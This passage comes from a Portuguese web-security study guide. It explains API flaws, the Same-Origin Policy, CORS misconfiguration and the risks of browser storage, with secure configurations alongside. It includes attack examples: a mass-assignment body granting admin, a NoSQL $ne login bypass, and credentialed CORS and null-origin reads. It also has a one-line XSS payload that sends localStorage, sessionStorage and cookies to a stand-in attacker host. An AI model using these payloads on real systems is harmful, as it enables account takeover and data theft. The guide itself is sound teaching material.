   - *Na entrada (Mass Assignment):* o back-end atualiza o perfil fazendo `await Usuario.update(req.body, { where: { id: req.usuario.id } })`. Um atacante intercepta ou envia via Console um `PATCH /api/v1/perfil` com `{"nome": "João", "role": "admin", "saldoCarteira": 999999}` e sobrescreve colunas privilegiadas do banco!
3. **Ausência de Rate Limiting e Consumo Irrestrito de Recursos (API4:2023):** não limitar quantas requisições um cliente pode fazer por minuto ou permitir `?limit=99999999` permite ataques de negação de serviço (DoS), força bruta de OTP e raspagem completa da base de dados (*scraping*).
4. **Falta de Validação de Schema e Content-Type:** aceitar qualquer estrutura JSON sem validar tipos primitivos permite **NoSQL Injection** (ex.: enviar `{"email": "admin@loja.test", "senha": {"$ne": null}}` em bancos como MongoDB, onde o operador `$ne` avalia como verdadeiro para qualquer senha diferente de nulo!).

##### Configuração segura

- **[REQUISITO]** Validar autorização em nível de objeto (**BOLA**) em **toda** rota que receba um ID: a consulta ao banco deve filtrar simultaneamente pelo ID do objeto e pelo ID do usuário autenticado na sessão/token (`WHERE id = $1 AND usuario_id = $2`).
- **[REQUISITO]** Nunca retornar entidades cruas do banco (usar DTOs — *Data Transfer Objects* — ou projeção explícita das colunas permitidas na saída) e nunca passar `req.body` diretamente para o ORM (definir uma *allowlist* estrita dos campos editáveis na entrada).
- **[REQUISITO]** Validar o schema de entrada (tipos, tamanhos máximos, formatos) com bibliotecas como **Zod**, **Joi** ou **Pydantic**, impondo limite de tamanho ao payload JSON (ex.: `express.json({ limit: '100kb' })`).
- **[RECOMENDAÇÃO]** Aplicar *rate limiting* (retornando `429 Too Many Requests` e header `Retry-After`), impor teto máximo de paginação e usar identificadores opacos (UUIDv4 / ULID) em vez de inteiros sequenciais previsíveis (lembrando que UUID **não substitui** a verificação de autorização no servidor!).

---

<a id="s1-11"></a>
### 1.11 CORS e Same-Origin Policy (SOP)

Imagine o que aconteceria se, enquanto você estivesse logado no seu webmail ou banco em uma aba do navegador, você abrisse uma segunda aba com um site de jogos malicioso (`https://jogos-gratis.test`) e o JavaScript desse site pudesse simplesmente fazer `fetch('https://meu-banco.test/api/extrato', { credentials: 'include' })` e ler todo o seu saldo e mensagens privadas. A web seria completamente inviável.

Para impedir esse cenário, os navegadores implementam duas peças complementares:
1. **Same-Origin Policy (SOP — Política de Mesma Origem):** a barreira de isolamento **padrão e restritiva** do navegador.
2. **CORS (*Cross-Origin Resource Sharing* — Compartilhamento de Recursos de Origem Cruzada):** o mecanismo controlado, baseado em headers HTTP, pelo qual um servidor declara explicitamente quais outras origens têm permissão para flexibilizar a SOP e ler suas respostas.

<a id="s1-11-1"></a>
#### 1.11.1 Same-Origin Policy (SOP)

**O que é:** a **Same-Origin Policy (SOP)** é o pilar fundamental da segurança do modelo de execução dos navegadores web (definida na especificação HTML do WHATWG e na **RFC 6454**). Ela restringe como um documento ou script carregado de uma **origem** pode interagir com recursos pertencentes a **outra origem**.

**Para que serve:** isolar sites diferentes que rodam simultaneamente no mesmo navegador, impedindo que uma página maliciosa leia dados confidenciais (DOM, respostas HTTP de APIs, `localStorage`, `IndexedDB`) de outra aplicação na qual o usuário esteja autenticado.

**Como funciona (Definição exata de Origem):**

Duas URLs possuem a **mesma origem (*same-origin*)** se, e somente se, coincidirem exatamente na **tríade (tupla)**:

$$\text{Origem} = (\text{Esquema / Protocolo}, \; \text{Host / Domínio exato}, \; \text{Porta})$$

Qualquer diferença em **qualquer um** desses três componentes caracteriza uma **origem cruzada (*cross-origin*)**! O caminho da URL (`/path`) e a query string (`?a=1`) **não** fazem parte da origem.

##### Tabela comparativa de Origens (Referência para Prova)

Tomando como base a página atual carregada em **`https://loja-ficticia.test/produtos/item.html`** (onde a porta implícita do `https` é **`443`**):

| URL Comparada | Mesma Origem (*Same-Origin*)? | Mesmo Site (*Same-Site*)? | Motivo Técnico |
|---|---|---|---|
| `https://loja-ficticia.test/carrinho/checkout.html` | **SIM** | Sim | Mesmo esquema (`https`), mesmo host (`loja-ficticia.test`) e mesma porta (`443`). Só mudou o caminho. |
| `https://loja-ficticia.test:443/api/v1/perfil` | **SIM** | Sim | `443` já é a porta padrão do `https`. |
| `http://loja-ficticia.test/produtos/item.html` | **NÃO** (*Cross-Origin*) | Não (*schemeful*) | Mudou o **esquema** (`http` vs `https`) e a porta padrão (`80` vs `443`). |
| `https://loja-ficticia.test:8443/produtos/item.html` | **NÃO** (*Cross-Origin*) | Sim | Mudou a **porta** (`8443` vs `443`). |
| `https://api.loja-ficticia.test/produtos/item.html` | **NÃO** (*Cross-Origin*) | Sim | Mudou o **host** (subdomínio `api.loja-ficticia.test` $\neq$ `loja-ficticia.test`). |
| `https://loja-ficticia.com.br/produtos/item.html` | **NÃO** (*Cross-Origin*) | Não | Mudou o **host** (domínio diferente). |

##### O que a SOP permite vs. o que a SOP bloqueia por padrão

Uma dúvida muito comum em provas é achar que a SOP "bloqueia qualquer requisição para outro domínio". **Isso está incorreto!** A SOP trata envios (*writes*), inclusões (*embeds*) e leituras (*reads*) de formas diferentes:

| Tipo de Interação Cross-Origin | Regra Padrão da SOP | Exemplos | Consequência de Segurança |
|---|---|---|---|
| **1. *Cross-Origin Writes* (Escritas/Envios)** | **Geralmente PERMITIDOS** | Submissão de `<form action="https://outro-site.test/...">`, cliques em links `<a href="...">`, redirecionamentos. | **É por isso que ataques de CSRF existem!** O navegador **envia** a requisição para o outro site (e o servidor a processa se não houver proteção anti-CSRF), embora a SOP impeça o site atacante de ler a resposta. |
| **2. *Cross-Origin Embeddings* (Inclusões de sub-recursos)** | **Geralmente PERMITIDOS** | `<script src="...">`, `<link rel="stylesheet">`, `<img src="...">`, `<video>`, `<audio>`, `<iframe src="...">`. | Permite usar CDNs e imagens externas, mas exige proteções adicionais como `X-Frame-Options` / `CSP: frame-ancestors` (contra Clickjacking) e `CORP` (*Cross-Origin-Resource-Policy*). |
| **3. *Cross-Origin Reads* (Leituras de dados)** | **BLOQUEADOS PELA SOP!** | Ler o corpo/headers da resposta de um `fetch()` ou `XMLHttpRequest` cross-origin; ler `iframe.contentDocument` de outra origem; ler pixels de um `<canvas>` contaminado por imagem cross-origin. | Impede o roubo direto de dados confidenciais entre origens. Para permitir a leitura via `fetch`/`XHR`, o servidor de destino precisa autorizar via **CORS**. |

---

<a id="s1-11-2"></a>
#### 1.11.2 CORS (Cross-Origin Resource Sharing)

**O que é:** o **CORS** (*Cross-Origin Resource Sharing* — compartilhamento de recursos de origem cruzada), padronizado no **Fetch Standard do WHATWG**, é um protocolo baseado em headers HTTP que permite a um servidor (ex.: `https://api.loja-ficticia.test`) informar ao navegador que uma origem diferente (ex.: o front-end SPA hospedado em `https://app.loja-ficticia.test`) tem permissão para acessar e ler as respostas de suas APIs.

**Para que serve:** viabilizar arquiteturas modernas onde o front-end (`app.loja-ficticia.test`) e o back-end (`api.loja-ficticia.test`) estão em subdomínios, portas ou domínios distintos, mantendo a proteção da SOP contra todos os demais sites da internet.

**Como funciona (Requisições Simples vs. Requisições com *Preflight* `OPTIONS`):**

O navegador divide as requisições cross-origin feitas por JavaScript (`fetch` / `XMLHttpRequest`) em dois fluxos:

##### 1. Requisições Simples (*Simple Requests*)

São requisições que um formulário HTML tradicional já conseguia disparar antes mesmo de o CORS existir. Uma requisição só é considerada **simples** se cumprir **TODAS** as condições abaixo simultaneamente:
- **Método HTTP:** exclusivamente `GET`, `HEAD` ou `POST`.
- **Headers definidos pelo código JS:** apenas headers seguros (*CORS-safelisted request-headers*): `Accept`, `Accept-Language`, `Content-Language` e `Content-Type` (além de `Range` simples).
- **Valor do `Content-Type`:** exclusivamente um destes três:
  - `application/x-www-form-urlencoded`
  - `multipart/form-data`
  - `text/plain`
- Sem ouvintes de progresso de upload (`XMLHttpRequestUpload`) e sem `ReadableStream` na requisição.

**Fluxo da Requisição Simples:** o navegador envia a requisição **diretamente** ao servidor acrescentando o header `Origin: https://app.loja-ficticia.test`. O servidor processa a requisição e devolve a resposta. Ao receber a resposta, o **navegador** confere se há o header `Access-Control-Allow-Origin` correspondente: se houver, entrega os dados ao JavaScript; se não houver, **suprime a resposta para o JavaScript** e lança um erro de CORS no Console!

##### 2. Requisições com *Preflight* (Sondagem prévia com `OPTIONS`)

Qualquer requisição que não cumpra todas as regras de requisição simples — por exemplo, usar os métodos **`PUT`**, **`DELETE`** ou **`PATCH`**, enviar **`Content-Type: application/json`** ou incluir um header personalizado como **`Authorization: Bearer ...`** — exige uma **verificação prévia (*Preflight Request*)** antes que a requisição real possa ser enviada!

```mermaid
sequenceDiagram
    participant JS as Código JS (app.loja-ficticia.test)
    participant Nav as Navegador
    participant API as Servidor API (api.loja-ficticia.test)
    JS->>Nav: fetch('https://api.loja-ficticia.test/v1/pedidos', { method: 'POST', headers: {'Content-Type': 'application/json'} })
    Note over Nav: Detecta cross-origin + application/json -> Exige Preflight!
    Nav->>API: 1. OPTIONS /v1/pedidos (Origin + Access-Control-Request-Method + Access-Control-Request-Headers)
    API-->>Nav: 204 No Content (Access-Control-Allow-Origin + Allow-Methods + Allow-Headers + Max-Age)
    Note over Nav: Preflight aprovado pelo servidor!
    Nav->>API: 2. POST /v1/pedidos (Origin + Content-Type: application/json + Body JSON)
    API-->>Nav: 201 Created (Access-Control-Allow-Origin + Body JSON)
    Nav-->>JS: Resolve a Promise do fetch() com a resposta
```

##### Tabela completa dos Headers de CORS

| Header | Direção | Função Técnica |
|---|---|---|
| `Origin` | Requisição | Informa a origem (`esquema://host:porta`) de onde partiu a requisição (controlado pelo navegador; o JS não pode falsificá-lo). |
| `Access-Control-Request-Method` | Requisição (*Preflight*) | No `OPTIONS`, pergunta ao servidor se o método da requisição real (ex.: `DELETE`, `POST`) é permitido. |
| `Access-Control-Request-Headers` | Requisição (*Preflight*) | No `OPTIONS`, lista quais headers não simples o JS quer enviar (ex.: `authorization, content-type`). |
| **`Access-Control-Allow-Origin` (ACAO)** | Resposta | Informa qual origem pode ler a resposta: uma origem exata (`https://app.loja-ficticia.test`) ou `*` (qualquer origem, somente para recursos públicos sem credenciais). |
| **`Access-Control-Allow-Credentials` (ACAC)** | Resposta | Quando igual a `true`, permite que o navegador envie e exponha respostas de requisições feitas com credenciais (`cookies`, certificados TLS, `Authorization` gerenciado pelo navegador) quando `credentials: 'include'` é usado no `fetch`. |
| `Access-Control-Allow-Methods` | Resposta (*Preflight*) | Lista os métodos HTTP autorizados para a origem (ex.: `GET, POST, PUT, DELETE`). |
| `Access-Control-Allow-Headers` | Resposta (*Preflight*) | Lista os headers de requisição autorizados (ex.: `Content-Type, Authorization`). |
| `Access-Control-Expose-Headers` | Resposta | Lista quais headers da resposta (além dos básicos como `Cache-Control` e `Content-Type`) o JS tem permissão para ler via `response.headers.get(...)` (ex.: `X-Total-Count, X-Request-Id`). |
| `Access-Control-Max-Age` | Resposta (*Preflight*) | Tempo em **segundos** pelo qual o navegador pode guardar o resultado do *preflight* em cache sem repetir o `OPTIONS` a cada chamada (no Chrome, o teto máximo é `7200` segundos = 2 horas). |
| **`Vary: Origin`** | Resposta | **Indispensável** quando o servidor retorna valores dinâmicos em `Access-Control-Allow-Origin`: avisa caches e CDNs que a resposta muda conforme o header `Origin` da requisição! |

**Exemplo prático (Preflight `OPTIONS` e Resposta Real em HTTP Bruto):**

```http
# 1. Requisição Preflight enviada automaticamente pelo navegador:
OPTIONS /v1/transferencia HTTP/1.1
Host: api.loja-ficticia.test
Origin: https://app.loja-ficticia.test
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type

# 2. Resposta do servidor aprovando o Preflight:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.loja-ficticia.test
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600
Vary: Origin
```

---

<a id="s1-11-3"></a>
#### 1.11.3 Problemas de segurança em CORS e configuração segura

Erros de configuração de CORS estão entre as vulnerabilidades mais frequentes em auditorias de APIs modernas ([Seção 3.7](./03a-vulnerabilidades-parte1.md#s3) e [Seção 5.10/5.11](./05-headers-de-seguranca.md#s5)):

##### 1. O erro mais grave: Refletir `Origin` arbitrário + `Access-Control-Allow-Credentials: true`

Pela especificação do Fetch, os navegadores **proíbem e bloqueiam** a combinação coringa:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ❌ BLOQUEADO PELO NAVEGADOR!
```
Para "fazer funcionar rápido" sem entender o motivo desse bloqueio, muitos desenvolvedores programam o servidor para simplesmente **copiar o valor do header `Origin` da requisição para dentro do `Access-Control-Allow-Origin` da resposta**, mantendo `Access-Control-Allow-Credentials: true`.

> [!CAUTION]
> **Por que isso é catastrófico?** Refletir qualquer `Origin` com `Access-Control-Allow-Credentials: true` equivale a **desativar completamente a Same-Origin Policy** da sua aplicação! Se a vítima estiver logada em `loja-ficticia.test` (com cookie `SameSite=None`) e visitar `https://site-do-atacante.test`, o JavaScript do atacante faz `fetch('https://api.loja-ficticia.test/v1/dados-pessoais', { credentials: 'include' })`. O servidor reflete `Access-Control-Allow-Origin: https://site-do-atacante.test` com `Access-Control-Allow-Credentials: true`, e o navegador entrega todos os dados privados da vítima para o script do atacante!

##### 2. Aceitar a origem `null` (`Access-Control-Allow-Origin: null`)

Alguns servidores adicionam a string literal `"null"` na lista de origens permitidas para facilitar testes com arquivos locais (`file://`). Porém, **qualquer site malicioso na internet consegue forçar o navegador a enviar `Origin: null`** simplesmente criando um `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.loja-ficticia.test/v1/segredo', {credentials: 'include'})...</script>">`. Se o servidor responder `Access-Control-Allow-Origin: null` e `Access-Control-Allow-Credentials: true`, o iframe malicioso lê a resposta autenticada!

##### 3. Erros de validação de `Origin` por Regex ou Substring

Validar o header `Origin` com métodos parciais de string ou expressões regulares mal escritas permite bypass imediato:
- `origin.startsWith("https://loja-ficticia.test")` $\rightarrow$ **Vulnerável!** O atacante registra o domínio `https://loja-ficticia.test.atacante.com` e passa no filtro!
- `origin.endsWith("loja-ficticia.test")` $\rightarrow$ **Vulnerável!** O atacante registra `https://maliciosoloja-ficticia.test` e passa no filtro!
- Regex `^https://.*\.loja-ficticia\.test$` $\rightarrow$ Confia em **todos** os subdomínios; se houver um único subdomínio abandonado ou com XSS (`blog-antigo.loja-ficticia.test`), ele poderá ler dados da API principal. (E se esquecer de escapar o ponto `.`, qualquer caractere casa no lugar do ponto!).

##### 4. Quando `Access-Control-Allow-Origin: *` é seguro (e quando não é)

O coringa `*` **só é seguro** para **recursos 100% públicos** que não dependem de cookies, de cabeçalho `Authorization` nem de restrição por rede interna/IP (ex.: uma API pública de consulta de CEP, fontes web públicas, arquivos estáticos de CDN). Em uma intranet corporativa, colocar `Access-Control-Allow-Origin: *` em um painel interno sem senha permite que qualquer site externo visitado por um funcionário leia os dados internos da empresa usando o navegador do funcionário como ponte!

##### Configuração segura

- **[REQUISITO]** Validar o header `Origin` comparando-o por **igualdade exata de string** contra uma **lista fechada (*allowlist*)** de origens confiáveis antes de refleti-lo.
- **[REQUISITO]** Nunca permitir `Origin: null` em produção e nunca refletir origens arbitrárias com `Access-Control-Allow-Credentials: true`.
- **[REQUISITO]** Incluir sempre `Vary: Origin` na resposta quando `Access-Control-Allow-Origin` variar dinamicamente conforme a *allowlist* (evita envenenamento de cache em CDNs).
- **[BOA PRÁTICA]** Lembrar que **CORS é uma política aplicada apenas por navegadores**: ele não impede que um atacante chame a API diretamente via `curl`, Postman ou script Python, e **não substitui proteção anti-CSRF** em requisições simples!

```javascript
// Node.js / Express — Configuração SEGURA de CORS com Allowlist Estrita
const ORIGENS_PERMITIDAS = new Set([
  'https://app.loja-ficticia.test',
  'https://admin.loja-ficticia.test'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Vary', 'Origin'); // Sempre informe caches intermediários!

  if (origin && ORIGENS_PERMITIDAS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
    res.setHeader('Access-Control-Max-Age', '3600');
  }

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
```

---

<a id="s1-12"></a>
### 1.12 Local Storage, Session Storage e IndexedDB

Além dos cookies ([1.7.1](#s1-7-1)), os navegadores modernos oferecem APIs dedicadas ao **armazenamento de dados no lado do cliente (*Client-Side Storage*)**: a **Web Storage API** (que compreende `localStorage` e `sessionStorage`, definida no HTML Living Standard do WHATWG) e o **IndexedDB** (W3C).

Três características fundamentais unem essas três tecnologias:
1. **Isolamento estrito por Origem (*Same-Origin Policy* — [1.11.1](#s1-11-1)):** cada origem `(esquema, host, porta)` possui seus próprios bancos e áreas de armazenamento. `https://loja-ficticia.test` não consegue ler o `localStorage` de `https://api.loja-ficticia.test` nem de `http://loja-ficticia.test`. *(Nota: nos navegadores modernos, o armazenamento em iframes de terceiros também é **particionado** pela origem de nível superior — Storage Partitioning **[Varia por versão]**).*
2. **Não são enviados automaticamente na rede:** diferente dos cookies, que viajam no header `Cookie` de toda requisição HTTP aplicável, os dados guardados em `localStorage`, `sessionStorage` e `IndexedDB` permanecem exclusivamente no navegador até que um código JavaScript os leia e decida enviá-los.
3. **100% acessíveis via JavaScript da mesma origem:** não existe atributo equivalente ao `HttpOnly` para Web Storage ou IndexedDB. Qualquer script que execute na origem (inclusive bibliotecas de terceiros ou código injetado via XSS) tem leitura e escrita total sobre eles.

<a id="s1-12-1"></a>
#### 1.12.1 Local Storage

**O que é:** o **`window.localStorage`** é um armazenamento chave-valor síncrono e **persistente** no navegador, isolado por origem, onde tanto as chaves quanto os valores são armazenados exclusivamente como **strings** (UTF-16).

**Para que serve:** guardar preferências de interface não sensíveis que devem sobreviver ao fechamento do navegador (ex.: escolha entre tema claro/escuro, estado de recolhimento da barra lateral, idioma preferido da UI, rascunho não confidencial de texto).

**Como funciona:**
- **Persistência:** **não possui data de expiração nativa**. Os dados permanecem gravados em disco mesmo após fechar a aba, encerrar o navegador ou reiniciar o computador, só sendo apagados se o JavaScript chamar `removeItem`/`clear`, se o servidor enviar o header `Clear-Site-Data: "storage"`, ou se o usuário limpar os dados de navegação (no modo de navegação anônima/privada, o `localStorage` é descartado ao fechar a última janela anônima).
- **Escopo:** compartilhado instantaneamente entre **todas as abas e janelas** abertas na mesma origem (inclusive dispara o evento `window.addEventListener('storage', ...)` nas outras abas da mesma origem quando um valor muda).
- **Capacidade e Sincronismo:** suporta tipicamente cerca de **5 MB (5 MiB) por origem** (se estourar a cota, lança a exceção `QuotaExceededError`). A API é **síncrona e bloqueante**: ler ou gravar strings enormes trava a thread principal do JavaScript e congela a interface.

**Exemplo prático:**

```javascript
// 1. Gravando strings simples:
localStorage.setItem('ui_tema', 'escuro');
console.log(localStorage.getItem('ui_tema')); // "escuro"

// 2. Gravando objetos (OBRIGATÓRIO usar JSON.stringify, senão vira "[object Object]"):
const preferencias = { fonteTamanho: 16, barraRecolhida: true };
localStorage.setItem('ui_prefs', JSON.stringify(preferencias));

// 3. Lendo objetos com segurança (tratando JSON inválido):
function lerPreferencias() {
  const bruto = localStorage.getItem('ui_prefs');
  if (!bruto) return null;
  try {
    return JSON.parse(bruto);
  } catch {
    localStorage.removeItem('ui_prefs');
    return null;
  }
}

// 4. Removendo uma chave ou limpando toda a origem:
localStorage.removeItem('ui_tema');
// localStorage.clear(); // Apaga TODAS as chaves desta origem
```

##### Possíveis problemas de segurança e Configuração segura

- **Vulnerabilidade total a XSS:** guardar tokens de sessão, JWTs, chaves de API, senhas ou dados pessoais (CPF, cartão, histórico médico) no `localStorage` permite que qualquer falha de XSS exfiltre tudo instantaneamente e que os dados fiquem esquecidos no disco de computadores compartilhados (lan houses, laboratórios, bibliotecas) mesmo após fechar o navegador.
- **Manipulação pelo próprio usuário:** na aba **Application $\rightarrow$ Local Storage** do Chrome DevTools ([Seção 2.2](./02b-devtools-application.md#s2-2)), o usuário pode criar, editar ou excluir qualquer chave com dois cliques. Se o código JS confiar em `localStorage.getItem('plano_assinatura') === 'premium'` sem validar no servidor, o controle é facilmente burlado.
- **[REQUISITO]** Nunca armazenar senhas, tokens de autenticação de longa duração ou dados pessoais sensíveis no `localStorage`. Validar e sanitizar qualquer dado lido do `localStorage` antes de inseri-lo no DOM (pois o `localStorage` pode atuar como *Source* de DOM XSS persistente no cliente!).

---

<a id="s1-12-2"></a>
#### 1.12.2 Session Storage

**O que é:** o **`window.sessionStorage`** implementa exatamente a mesma interface de métodos do `localStorage` (`setItem`, `getItem`, `removeItem`, `clear`, `key`, `length`), armazenando pares chave-valor como strings (~5 MB por origem), porém com **ciclo de vida e escopo estritamente atrelados à aba/guia atual**.

**Para que serve:** guardar estado temporário de interface vinculado a um fluxo em uma única aba (ex.: etapa atual de um formulário *wizard* de várias páginas, posição de rolagem, filtros aplicados em uma tabela que o usuário pode abrir de forma independente em duas abas diferentes).

**Como funciona (Diferença crucial para o `localStorage` em provas):**

- **Escopo por Aba (*Top-Level Browsing Context*) + Origem:** se o usuário abrir `https://loja-ficticia.test` na **Aba 1** e depois abrir uma nova aba em branco (**Aba 2**) e digitar `https://loja-ficticia.test`, a Aba 1 e a Aba 2 terão instâncias de `sessionStorage` **completamente separadas e independentes**! *(Observação técnica: se uma aba abrir outra via link/script que mantenha relação de sessão ou ao usar "Duplicar aba", o navegador pode copiar o estado inicial do `sessionStorage` para a nova aba no momento da criação, mas a partir daí ambas seguem independentes **[Varia por versão]**).*
- **Persistência (Expiração):** os dados **sobrevivem a recarregamentos da página (`F5`)** e a navegações entre páginas da mesma origem dentro daquela mesma aba, mas **são apagados imediatamente assim que a aba (ou janela) é fechada**.

**Exemplo prático:**

```javascript
// Mantendo o rascunho de busca apenas enquanto a aba atual estiver aberta:
const campoFiltro = document.querySelector('#filtro-tabela');

// Ao carregar a página (ou dar F5), restaura o filtro daquela aba específica:
campoFiltro.value = sessionStorage.getItem('filtro_aba_atual') ?? '';

// Ao digitar, atualiza o sessionStorage da aba:
campoFiltro.addEventListener('input', (e) => {
  sessionStorage.setItem('filtro_aba_atual', e.target.value);
});
```

##### Possíveis problemas de segurança e Configuração segura

- Embora o `sessionStorage` reduza o risco de dados esquecidos em disco após fechar a aba (em comparação ao `localStorage`), **ele continua 100% acessível via JavaScript (`window.sessionStorage`)**. Se ocorrer um ataque de XSS enquanto o usuário estiver com a aba aberta, o atacante rouba qualquer token guardado no `sessionStorage` exatamente com a mesma facilidade com que roubaria do `localStorage`!
- **[REQUISITO]** Não tratar o `sessionStorage` como cofre seguro contra XSS; usá-lo apenas para estado efêmero de UI não crítico e limpar explicitamente (`sessionStorage.clear()`) no fluxo de logout.

---

<a id="s1-12-3"></a>
#### 1.12.3 IndexedDB

**O que é:** o **IndexedDB** é um banco de dados transacional NoSQL (orientado a objetos chave-valor estruturados) de baixa camada embutido no navegador, projetado para armazenar **grandes volumes de dados estruturados** e arquivos binários.

**Para que serve:** alimentar aplicações web que funcionam *offline* (PWAs — *Progressive Web Apps*), editores de documentos/imagens no navegador, catálogos extensos de produtos com busca rápida por múltiplos campos e sincronização em segundo plano via **Service Workers** ([Seção 2.2](./02b-devtools-application.md#s2-2)).

**Como funciona:**

Diferente da Web Storage API (`localStorage`/`sessionStorage`), o IndexedDB possui quatro diferenciais técnicos fundamentais:
1. **API Assíncrona e baseada em Eventos/Transações:** não bloqueia a thread principal da interface e **pode ser acessada tanto na janela principal (`window`) quanto dentro de *Web Workers* e *Service Workers*** (onde o `localStorage` síncrono não existe!).
2. **Suporte a Tipos Complexos (*Structured Clone Algorithm*):** não exige `JSON.stringify()`. Armazena nativamente objetos JavaScript aninhados, `Date`, `Map`, `Set`, `ArrayBuffer`, `Blob` e `File` (imagens, PDFs, áudios).
3. **Estrutura de Banco de Dados com Índices e Transações:** cada origem pode ter múltiplos **Databases** (versionados); cada banco contém **Object Stores** (equivalentes a tabelas/coleções) com chave primária (`keyPath` ou `autoIncrement`), **Indexes** (índices secundários para consultas rápidas sem varrer tudo) e todas as leituras/escritas ocorrem dentro de **Transactions** (`readonly` ou `readwrite`), garantindo atomicidade (se uma operação falhar, a transação faz *rollback*).
4. **Alta Capacidade (Cota Dinâmica):** enquanto o `localStorage` é limitado a ~5 MB, o IndexedDB compartilha a cota de armazenamento da origem no disco do usuário (no Chrome, uma origem pode usar até 60% do espaço em disco disponível, frequentemente vários Gigabytes **[Varia por versão]**).

**Exemplo prático (Criando banco, Object Store, gravando e consultando no IndexedDB):**

```javascript
// Abrindo (ou criando) o banco 'CatalogoOfflineDB' na versão 1:
const requisicaoAbertura = indexedDB.open('CatalogoOfflineDB', 1);

// Disparado quando o banco é criado pela primeira vez ou sobe de versão:
requisicaoAbertura.onupgradeneeded = (event) => {
  const db = event.target.result;
  if (!db.objectStoreNames.contains('produtos')) {
    const store = db.createObjectStore('produtos', { keyPath: 'id' });
    store.createIndex('por_categoria', 'categoria', { unique: false });
  }
};

requisicaoAbertura.onsuccess = (event) => {
  const db = event.target.result;

  // Gravando um registro dentro de uma transação 'readwrite':
  const tx = db.transaction(['produtos'], 'readwrite');
  const store = tx.objectStore('produtos');
  store.put({
    id: 'prod_101',
    nome: 'Teclado Mecânico',
    categoria: 'perifericos',
    atualizadoEm: new Date() // Salva o objeto Date nativo sem precisar de JSON!
  });

  tx.oncomplete = () => console.log('Produto salvo no IndexedDB com sucesso!');
};
```

##### Possíveis problemas de segurança e Configuração segura

- **O mito da "obscuridade do IndexedDB":** alguns desenvolvedores (e até bibliotecas de autenticação) guardam tokens e chaves no IndexedDB achando que, por ser mais trabalhoso de ler que `localStorage.getItem()`, estaria protegido. **Isso é falso!** Qualquer script XSS na mesma origem pode chamar `await indexedDB.databases()` e ler todas as *Object Stores* em poucas linhas de código. Além disso, o usuário (ou alguém com acesso físico ao computador) vê todos os registros abertos em tabela na aba **Application $\rightarrow$ IndexedDB** do DevTools.
- **[REQUISITO]** Não armazenar segredos, senhas ou tokens de sessão de longa duração em texto claro no IndexedDB. Em aplicações *offline-first* que precisem sincronizar dados sensíveis, minimizar os campos salvos, criptografar com chave derivada da sessão em memória (Web Crypto API `SubtleCrypto`) e destruir o banco no logout (`indexedDB.deleteDatabase('...')` + header `Clear-Site-Data: "storage"`).

---

<a id="s1-12-4"></a>
#### 1.12.4 Comparativo de armazenamento no cliente e segurança

A tabela abaixo consolida todas as propriedades cobradas em provas acadêmicas e entrevistas técnicas sobre os quatro mecanismos de armazenamento no navegador:

| Critério Técnico | Cookies ([1.7.1](#s1-7-1)) | Local Storage ([1.12.1](#s1-12-1)) | Session Storage ([1.12.2](#s1-12-2)) | IndexedDB ([1.12.3](#s1-12-3)) |
|---|---|---|---|---|
| **Capacidade típica** | ~4 KB por cookie | ~5 MB por origem | ~5 MB por origem/aba | Dezenas de MB a vários GB (cota do disco) |
| **Tipos de dados suportados** | Apenas strings ASCII | Apenas strings (UTF-16; exige `JSON` para objetos) | Apenas strings (UTF-16; exige `JSON` para objetos) | Objetos estruturados, `Date`, `Blob`, `File`, `ArrayBuffer` |
| **Persistência / Expiração** | Configurável (`Expires` / `Max-Age`) ou até fim da sessão | **Permanente** (não expira sozinho; persiste em disco) | **Apenas até fechar a aba** (sobrevive ao `F5`) | **Permanente** (não expira sozinho; persiste em disco) |
| **Escopo de isolamento** | Site/Domínio + `Path` (controlado por atributos) | Origem (`esquema + host + porta`) — todas as abas | Origem **+ Aba única** (*Top-Level Browsing Context*) | Origem (`esquema + host + porta`) — todas as abas |
| **Enviado automaticamente nas requisições HTTP?** | **SIM** (no header `Cookie` de toda requisição aplicável) | **NÃO** | **NÃO** | **NÃO** |
| **Acessível via JavaScript?** | Sim, **EXCETO se tiver a flag `HttpOnly`!** | **SEMPRE SIM** (sem proteção contra leitura por XSS) | **SEMPRE SIM** (sem proteção contra leitura por XSS) | **SEMPRE SIM** (sem proteção contra leitura por XSS) |
| **Modelo de execução (Thread principal)** | Síncrono (`document.cookie`) / Automático via rede | **Síncrono** (pode bloquear a UI) | **Síncrono** (pode bloquear a UI) | **Assíncrono** (não bloqueia a UI; transacional) |
| **Acessível em Service Workers?** | Não diretamente (`CookieStore API` assíncrona parcial) | **NÃO** | **NÃO** | **SIM** |
| **Uso ideal e seguro** | ID de sessão / Refresh Token (`Secure; HttpOnly; SameSite`) | Preferências de UI persistentes não sensíveis (ex.: tema escuro) | Estado temporário de UI restrito a uma aba (ex.: etapa de formulário) | Grandes catálogos offline, cache estruturado de PWA, arquivos binários |

**Por que tokens de sessão e senhas NÃO devem ficar expostos ao JavaScript? (Demonstração prática):**

Se uma aplicação armazena o JWT de autenticação em `localStorage.setItem('auth_token', 'eyJ...')` e sofre **uma única vulnerabilidade de XSS** (mesmo em uma página secundária ou biblioteca de terceiros), o atacante injeta um payload de uma linha que varre todo o Web Storage e envia os tokens para um servidor externo:

```javascript
// Exemplo didático de laboratório: como 1 linha de XSS exfiltra TODO o localStorage e sessionStorage
// (Mas NUNCA consegue ler um cookie marcado com HttpOnly!):
fetch('https://coletor.atacante.test/leak', {
  method: 'POST',
  body: JSON.stringify({
    local: Object.entries(localStorage),
    session: Object.entries(sessionStorage),
    cookiesVisiveis: document.cookie // Cookies com HttpOnly NÃO aparecem aqui!
  })
});
```

---

<a id="s1-13"></a>
### 1.13 Cache do Navegador

